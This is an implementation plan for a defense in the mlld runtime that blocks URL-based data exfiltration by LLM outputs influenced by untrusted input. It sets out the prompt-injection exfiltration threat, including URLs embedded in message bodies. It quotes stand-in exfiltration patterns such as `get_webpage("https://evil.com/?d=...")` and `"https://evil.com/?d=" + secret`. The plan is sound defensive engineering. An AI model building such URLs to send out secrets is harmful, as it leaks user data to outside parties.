# Implementation Plan: URL Exfiltration Defense

## Overview

This plan implements `no-novel-urls` as a managed security feature for influenced-gated exe dispatch. The feature adds URL provenance metadata (`mx.urls`) to values, maintains an execution-wide registry of externally sourced URLs, and denies any exe invocation whose arguments contain `influenced` values with novel URLs relative to that registry. Scope for v1 includes both native tool calling and developer-authored forwarding of influenced LLM output; plain developer-authored execs with no influenced arguments remain out of scope.

## Current State

The current security model tracks labels, taint, attestations, sources, and tool provenance in the security descriptor model, but it has no first-class URL provenance channel.

- `core/types/security.ts:79-110` defines `SecurityDescriptor` and serialization with no URL field.
- `core/types/security.ts:345-400` merges descriptors, but only for labels, taint, attestations, sources, tools, capability, and policy context.
- `core/types/variable/VariableTypes.ts:105-140` defines `VariableContext`; it has flattened `url` and `domain` fields from load results, but no multi-URL provenance set.
- `core/types/variable/VarMxHelpers.ts:31-39` converts `mx` to a security descriptor, so any new security metadata must round-trip there.
- `interpreter/utils/structured-value.ts:572-655` builds structured `ctx` from descriptor metadata and is the main bridge between descriptor state and `.mx` inspection.
- `interpreter/hooks/guard-runtime-evaluator.ts:296-310` snapshots labels, taint, attestations, and sources for policy guards, but not URLs.
- `interpreter/policy/PolicyEnforcer.ts:44-51` auto-applies the `influenced` label to LLM outputs when `untrusted-llms-get-influenced` is active and the LLM processed untrusted input.
- `interpreter/eval/exec-invocation.ts:1922-1979` is the main exe-dispatch path where evaluated args, descriptors, control-arg metadata, and policy checks converge.
- `interpreter/env/Environment.ts:423-445` shares registries and context across child environments, which is the correct scope for planner/worker-wide URL provenance.
- External content enters through multiple paths, including URL reads in `interpreter/eval/show/show-path-handlers.ts:31-39`, imports in `interpreter/eval/import/ModuleContentProcessor.ts`, input imports in `interpreter/eval/import/InputImportHandler.ts`, and load-content wrappers in `interpreter/utils/load-content-structured.ts`.

## Problems

The runtime currently has no deterministic way to distinguish:

1. URLs copied verbatim from external inputs.
2. URLs constructed by the model at runtime by combining a destination with sensitive data.

That gap matters in two places:

- Direct fetches such as `get_webpage("https://evil.com/?d=...")`
- Indirect writes where a URL is embedded inside a message body and fetched later by downstream infrastructure

The spec now resolves the main design questions:

- URL provenance should live in the security metadata model, not as a sidecar registry only.
- String-materializing operations must re-extract URLs from final strings.
- Pass-through operations may union existing `mx.urls`.
- Enforcement happens at exe dispatch, gated by `influenced` labels on argument values.
- Domain construction allowlists are the only v1 escape hatch.

## Goals

1. Add `mx.urls` as first-class security metadata on variables and structured values.
2. Maintain a shared execution-wide URL registry seeded only from external inputs.
3. Enforce `no-novel-urls` for any exe invocation whose arguments carry `influenced`.
4. Support recursive scanning of nested argument structures and write-body URLs.
5. Keep v1 scope aligned with the spec: influenced-gated exe enforcement, no runtime warning for developer forwarding, no pagination escape hatch.

## Non-Goals

- Enforcing `no-novel-urls` on exec invocations whose arguments do not carry `influenced`
- Extending `policy.authorizations` beyond `tool:w`
- Adding runtime warnings for developer-authored LLM-output forwarding
- Adding a generic pagination exception

## Must-Read References

- `spec-url-exfiltration.md`
- `core/types/security.ts`
- `core/types/variable/VariableTypes.ts`
- `core/types/variable/VarMxHelpers.ts`
- `interpreter/utils/structured-value.ts`
- `interpreter/eval/exec-invocation.ts`
- `interpreter/policy/PolicyEnforcer.ts`
- `interpreter/hooks/guard-runtime-evaluator.ts`
- `interpreter/env/Environment.ts`
- `docs/src/atoms/effects/08-labels--influenced.md`
- `docs/dev/TESTS.md`
- `docs/dev/DOCS.md`

## Design Decisions

### 1. `urls` belongs in the security descriptor model

`mx.urls` should be carried by `SecurityDescriptor` alongside labels, taint, attestations, and sources. This keeps merge, normalization, serialization, guard snapshots, and structured-value hydration on one path instead of inventing a second metadata channel.

Expected changes:

- `core/types/security.ts`
- `core/types/variable/VarMxHelpers.ts`
- `interpreter/utils/structured-value.ts`

### 2. Registry and per-value metadata are separate concerns

- Per-value `mx.urls` answers: “what URLs are present in this value?”
- Execution-wide registry answers: “which URLs were externally sourced in this run?”

Both are needed. The registry alone is not enough for recursive arg scanning, and per-value URLs alone are not enough for provenance.

### 3. Propagation is operation-sensitive

Two propagation rules are required:

- Pass-through operations union input URLs.
- String-materializing operations re-extract from the final rendered string.

This is the critical invariant that prevents the `"https://evil.com/?d=" + secret` bypass.

### 4. Enforcement is attached to exe dispatch and gated by `influenced`

The rule should run in the normal exe-dispatch path, but only when at least one argument descriptor carries the `influenced` label. That gives the spec’s intended coverage:

- native tool-calling arguments produced by an influenced LLM
- developer-authored forwarding of influenced LLM output into later execs
- no impact on plain developer-authored execs or trusted-only LLM outputs

The managed rule therefore belongs in the general guard/runtime path for `op:exe`, not a `config.tools`-specific bridge.

### 5. Influence tracking is a hard dependency

`no-novel-urls` does not define its own provenance gate. It depends on the existing `untrusted-llms-get-influenced` rule to mark LLM outputs that processed untrusted input. Implementation and docs should make that dependency explicit.

### 6. External reads seed the registry at ingestion time

Registry population must happen when external content enters the runtime, not later by replaying tool-call history. Existing tool-call tracking does not reliably preserve full result payloads, so registry updates must be wired into read/import/load/fetch entrypoints directly.

## Architecture Sketch

### New security-descriptor shape

```typescript
type SecurityDescriptor = {
  labels: readonly DataLabel[];
  taint: readonly DataLabel[];
  attestations: readonly DataLabel[];
  sources: readonly string[];
  urls?: readonly string[];
  tools?: readonly ToolProvenance[];
  capability?: CapabilityKind;
  policyContext?: Readonly<Record<string, unknown>>;
};
```

### Runtime model

1. External input enters runtime.
2. URLs are extracted and normalized.
3. Extracted URLs are attached to the value descriptor as `urls`.
4. Extracted URLs are also recorded in the shared execution registry.
5. Value flows through transformations:
   - Pass-through operations union `urls`
   - String-materializing operations re-extract
6. Exe dispatch checks whether any argument descriptor carries `influenced`.
7. If so, the rule checks influenced argument `urls` against the registry.
8. Any non-allowlisted novel URL triggers managed denial.

## Implementation Phases

## Phase 1 – Descriptor and `mx` Plumbing (≈0.5-1 day)

**Goal**: Add `urls` to the core security metadata model and make it visible through `mx`.

### Tasks

1. **Extend security descriptor types and helpers** - `core/types/security.ts:79-110, 292-430`
   - Add `urls` to `SecurityDescriptor`, `SerializedSecurityDescriptor`, `makeSecurityDescriptor`, `normalizeSecurityDescriptor`, `mergeDescriptors`, and serialization helpers.
   - Define deterministic merge behavior:
     - union of normalized URL strings
     - stable ordering for serialization/debugging

2. **Extend variable context shape** - `core/types/variable/VariableTypes.ts:105-140`
   - Add `urls?: readonly string[]` to `VariableContext`.
   - Keep the existing flattened singular `url` field; it serves a different purpose.

3. **Bridge descriptor <-> var mx** - `core/types/variable/VarMxHelpers.ts:31-39, 42-90`
   - Include `urls` in `varMxToSecurityDescriptor`.
   - Hydrate `mx.urls` from descriptor metadata in `legacyMetadataToVarMx` and related helpers.

4. **Hydrate structured values with URL metadata** - `interpreter/utils/structured-value.ts:572-655`
   - Extend `buildVarMxFromMetadata` so structured values expose `.mx.urls`.
   - Ensure `extractSecurityDescriptor` and nested descriptor aggregation retain URLs.

5. **Expose URLs in guard snapshots and ambient context** - `interpreter/hooks/guard-runtime-evaluator.ts:296-310`, `interpreter/env/ContextManager.ts:408-449`
   - Add `urls` to policy arg descriptors and per-input snapshots.
   - Add `@mx.urls.registry` to ambient context.

### Testing

- Add unit tests for descriptor normalization/merge/serialization.
- Add tests proving `var.mx.urls` and structured `.mx.urls` round-trip through descriptors.
- Add guard snapshot tests to verify URLs are visible in policy guards.

### Exit Criteria

**Test Status**:
- [ ] New descriptor/metadata tests pass
- [ ] Existing security descriptor tests remain green

**Validation Checklist**:
- [ ] `SecurityDescriptor` can store and serialize `urls`
- [ ] `@value.mx.urls` is readable on variables and structured values
- [ ] `@mx.urls.registry` has a defined shape in ambient context

**Deliverable**: Core runtime types can represent URL provenance and surface it through `mx`.

## Phase 2 – URL Utilities and Propagation Rules (≈1-1.5 days)

**Goal**: Implement extraction, normalization, and correct propagation for pass-through vs string-materializing operations.

### Tasks

1. **Create URL extraction and normalization utilities** - new module under `core/security/` or `interpreter/utils/`
   - Implement regex-based extraction with trailing punctuation cleanup.
   - Implement normalization per spec:
     - lowercase scheme/host
     - remove default port
     - normalize percent-encoding
     - dot-segment resolution
     - normalize empty path
     - remove fragment
   - Implement domain allowlist matching for exact-domain-plus-subdomains and explicit wildcard entries.

2. **Seed `urls` on string and structured values** - `interpreter/utils/structured-value.ts`, `interpreter/eval/var/security-descriptor.ts`, `interpreter/eval/content-loader/security-metadata.ts`, `interpreter/utils/load-content-structured.ts`
   - Ensure newly wrapped values can derive `urls` from actual content.
   - Ensure container values can expose the union of nested URLs.

3. **Handle string-materializing operations by re-extraction** - `interpreter/utils/interpolation.ts`, `interpreter/eval/exec/builtins.ts:161-220`, plus any string-rendering pipeline/formatter path
   - Re-extract URLs from final strings for:
     - interpolation
     - concat/join-like operations that create strings
     - string builtins such as `slice`, `replace`, `trim`, `replaceAll`, `padStart`, `padEnd`, `repeat`
     - rendering-style pipeline transforms such as `pretty`

4. **Handle pass-through operations by union** - `interpreter/utils/field-access.ts`, `interpreter/eval/for/result-variable.ts`, `interpreter/eval/var/security-descriptor.ts`, container/selection helpers
   - Preserve/union `urls` where values are selected or rewrapped without changing string content.

### Testing

- Unit tests for extraction and normalization edge cases.
- Regression tests for:
  - literal strings with multiple URLs
  - nested objects/arrays
  - interpolation producing a novel URL
  - string `replace`/`slice`/`trim` preserving or changing URLs correctly
  - pass-through container operations retaining unions

### Exit Criteria

**Test Status**:
- [ ] URL utility tests pass
- [ ] Propagation tests cover both pass-through and materializing paths

**Validation Checklist**:
- [ ] Final-string re-extraction catches constructed URLs
- [ ] Pass-through operations do not lose known URLs
- [ ] No duplicate or non-normalized URLs appear in `mx.urls`

**Deliverable**: Runtime values compute `mx.urls` correctly across the major transformation paths.

## Phase 3 – Execution Registry and External Input Seeding (≈1 day)

**Goal**: Populate the execution-wide registry from external inputs at ingestion time.

### Tasks

1. **Add a shared URL registry to the environment root** - `interpreter/env/Environment.ts:423-445`, new helper module if needed
   - Mirror the sharing model used for handle/projection registries.
   - Add APIs such as:
     - `recordKnownUrls(urls: readonly string[])`
     - `getKnownUrls(): readonly string[]`
     - `hasKnownUrl(url: string): boolean`

2. **Expose registry through ambient `@mx`** - `interpreter/env/ContextManager.ts:408-449`
   - Add `@mx.urls.registry`.
   - Keep it inspectable in privileged guards without exposing a mutator path.

3. **Seed registry from input payloads and external reads**
   - `interpreter/eval/import/InputImportHandler.ts`
   - `interpreter/eval/import/ModuleContentProcessor.ts`
   - `interpreter/utils/load-content-structured.ts`
   - `interpreter/env/ImportResolver.ts:430+`
   - `interpreter/eval/show/show-path-handlers.ts:31-39`
   - `interpreter/policy/filesystem-policy.ts:74+`
   - Any additional content-loader entrypoint that materializes external content
   - Record URLs when content first enters the runtime, regardless of whether tool-call history stores the full payload.

4. **Define read-path conventions**
   - Confirm that imports, `<file>`, `<glob>`, `show` path reads, and fetched URL content all seed the same registry path.
   - Document which entrypoint owns registry updates to avoid double-recording logic scattered everywhere.

### Testing

- Tests proving registry updates from:
  - `@payload`
  - imports
  - file loads
  - `show` URL reads
  - successful fetched content
- Tests proving LLM outputs do not seed the registry.

### Exit Criteria

**Test Status**:
- [ ] Registry seeding tests pass across all major external-input paths

**Validation Checklist**:
- [ ] Planner-phase and worker-phase envs see the same registry
- [ ] Registry contains only normalized, externally sourced URLs
- [ ] LLM-produced values cannot bootstrap registry membership

**Deliverable**: The runtime maintains a shared, correct, execution-wide known-URL registry.

## Phase 4 – Managed Rule and Exe-Dispatch Enforcement (≈1 day)

**Goal**: Enforce `no-novel-urls` at influenced-gated exe dispatch and wire policy configuration.

### Tasks

1. **Add policy schema support** - `core/policy/builtin-rules.ts`, `core/policy/union.ts`, `core/types/policy.ts`
   - Add `no-novel-urls` to built-in rules.
   - Add `policy.urls.allowConstruction`.
   - Normalize and merge the `urls` policy section.

2. **Make the influence dependency explicit in runtime/docs surfaces** - `core/policy/builtin-rules.ts`, `interpreter/policy/PolicyEnforcer.ts`, policy validation/docs paths
   - Preserve the existing `untrusted-llms-get-influenced` behavior as the gate.
   - Ensure examples, validation, and activation paths make clear that `no-novel-urls` expects `influenced` labels on relevant values.

3. **Add managed-rule guard generation** - `core/policy/guards.ts`, `interpreter/hooks/guard-pre-hook.ts`, `interpreter/hooks/guard-runtime-evaluator.ts`
   - Create a managed guard that:
     - runs on `op:exe`
     - exits early when no argument is `influenced`
     - inspects arg descriptors for `urls`
     - checks each URL against the registry
     - honors `urls.allowConstruction`
     - emits standard managed denial metadata

4. **Hook enforcement to generic exe dispatch** - `interpreter/eval/exec-invocation.ts` and surrounding guard setup
   - Feed labels and `urls` for all evaluated args into the managed-rule path.
   - Ensure direct URL args and embedded write-body URLs are both covered by recursive arg scanning.
   - Verify the rule applies equally to native tool calls and developer-forwarded influenced values.

5. **Keep `exfil:fetch` controlArgs validation-only for this rule**
   - Reuse or extend the current control-arg validation conventions documented for `tool:w`.
   - Update validation paths so `mlld validate` enforces `exfil:fetch` control-arg declarations consistently with the spec.
   - Keep `no-novel-urls` enforcement independent from control-arg declarations.

6. **Preserve interactions with existing rules**
   - Ensure `no-send-to-unknown` still applies independently for `exfil:send`.
   - Ensure `no-secret-exfil` and `no-sensitive-exfil` still apply for `exfil:fetch`.

### Testing

- Managed-rule tests for:
  - direct fetch denial on novel URL
  - embedded write-body URL denial
  - developer-forwarded influenced output denial
  - no enforcement for developer-authored execs with no influenced args
  - no enforcement for trusted-only LLM output with no `influenced` label
  - allow when URL is registry-known
  - allow when domain matches `allowConstruction`
  - deny when same host but modified query/path/subdomain
  - `exfil:fetch` validation behavior when controlArgs are missing
- Integration tests around exe dispatch covering both `config.tools` and developer-forwarded invocations.

### Exit Criteria

**Test Status**:
- [ ] Managed-rule tests pass
- [ ] Exe-dispatch integration tests pass

**Validation Checklist**:
- [ ] Enforcement only fires when at least one argument is `influenced`
- [ ] Embedded message-body URLs are checked
- [ ] Developer-forwarded influenced values are checked
- [ ] Allowlist behavior matches spec exactly
- [ ] Existing security rules continue to work

**Deliverable**: `no-novel-urls` is enforceable under policy for influenced-gated exe dispatch.

## Phase 5 – Fixtures, Documentation, and Release Readiness (≈0.5-1 day)

**Goal**: Land tests, docs, and release notes so the feature is maintainable.

### Tasks

1. **Add fixture coverage** - `tests/cases/security/` and related interpreter tests
   - Add feature fixtures covering:
     - direct fetch exfil attempt
     - indirect Slack/email-body attempt
     - copied known URL allowed
     - string-built novel URL denied
     - allowConstruction for exact and wildcard domains
     - developer-forwarded influenced output denied
     - trusted-only LLM output not checked without `influenced`

2. **Update security/user docs**
   - `docs/src/atoms/security/`
   - `docs/src/atoms/effects/`
   - `docs/src/atoms/config/`
   - Add or update atoms for:
     - `mx.urls`
     - `no-novel-urls`
     - `policy.urls.allowConstruction`
     - `exfil:fetch` control-arg expectations

3. **Update developer docs if implementation introduces new invariants**
   - `docs/dev/DOCS.md` guidance says architecture/internal behavior belongs in `docs/dev/`
   - Add a concise dev note if the propagation contract or influenced-gated exe rule is subtle enough to surprise future maintainers.

4. **Add changelog entry** - `CHANGELOG.md`
   - Summarize the new managed rule, `mx.urls`, and influenced-gated exe scope.

### Testing

- `npm run build:fixtures`
- relevant targeted test suites
- `npm run build`
- full `npm test` before merge

### Exit Criteria

**Test Status**:
- [ ] New fixtures are generated and passing
- [ ] Full `npm test` passes
- [ ] `npm run build` succeeds

**Documentation**:
- [ ] User-facing atoms updated
- [ ] Dev docs updated if needed
- [ ] `CHANGELOG.md` entry added

**Validation Checklist**:
- [ ] Examples in docs match final behavior
- [ ] Influenced-gated exe scope is documented clearly
- [ ] No debug-only logging or instrumentation remains

**Deliverable**: Feature is documented, tested, and releasable.

## Testing Requirements

Per `docs/dev/TESTS.md`, this work needs both unit coverage and fixture-style behavioral coverage.

### Required New Coverage

- Security descriptor unit tests for `urls`
- Structured value / variable metadata tests for `.mx.urls`
- URL utility tests for extraction and normalization
- Propagation tests for:
  - pass-through operations
  - string-materializing operations
- Registry seeding tests for:
  - payload
  - imports
  - file reads
  - URL reads
- Managed rule tests for:
  - known URL allow
  - novel URL deny
  - embedded write-body URL deny
  - allowConstruction
  - influenced-gating behavior
  - `exfil:fetch` validation behavior
- Exe-dispatch integration tests covering `config.tools` and developer forwarding

### Existing Suites That Must Stay Green

- relevant `core/policy/*.test.ts`
- relevant `interpreter/eval/*.test.ts`
- `interpreter/url-support.test.ts`
- any tool-bridge / env-mcp-config tests impacted by broader exe-dispatch enforcement
- full `npm test`

### Edge Cases To Verify

- same URL with different case/default port/fragment
- same host with modified query params
- same host with modified path
- same registered URL embedded in a larger string
- multiple URLs in one body arg
- nested object/array arg payloads
- duplicate URLs and stable ordering
- non-URL strings that resemble URLs but should not parse

## Documentation Requirements

Per `docs/dev/DOCS.md`:

- Update user-facing atoms under `docs/src/atoms/` for the new rule and metadata.
- Add dev docs only if the propagation rules or boundary rules need internal maintenance guidance.
- Rebuild and validate documentation fixtures via `npm run build:fixtures`.

Expected doc targets:

- `docs/src/atoms/effects/` for `mx.urls` and managed-rule behavior
- `docs/src/atoms/config/` for `policy.urls.allowConstruction`
- `docs/src/atoms/security/` for the security model and `exfil:fetch`
- `CHANGELOG.md`

Note: there is no `docs/dev/USERDOCS.md` in the current tree; user-facing documentation guidance is in `docs/dev/DOCS.md`.

## Overall Exit Criteria

**Test Status**:
- [ ] `npm run build` succeeds
- [ ] `npm run build:fixtures` succeeds
- [ ] Full `npm test` passes
- [ ] New tests cover descriptor plumbing, propagation, registry seeding, and enforcement

**Documentation**:
- [ ] Security/user docs updated in `docs/src/atoms/`
- [ ] Dev docs updated if implementation adds non-obvious internal contracts
- [ ] `CHANGELOG.md` entry added

**Code Quality**:
- [ ] No debug flags or temporary logging left enabled
- [ ] New metadata paths use existing descriptor plumbing rather than ad hoc side channels
- [ ] Enforcement boundary matches the spec’s influenced-gated exe scope

**Security Validation**:
- [ ] Novel URLs produced by string construction are denied when they flow through influenced exe args
- [ ] Registry is seeded only from external inputs
- [ ] LLM outputs cannot self-bootstrap known-URL status
- [ ] Allowlist behavior is explicit and auditable

**Deliverable**: mlld has a deterministic `no-novel-urls` defense for influenced-gated exe dispatch, backed by first-class `mx.urls` metadata, shared execution provenance, tests, and documentation.
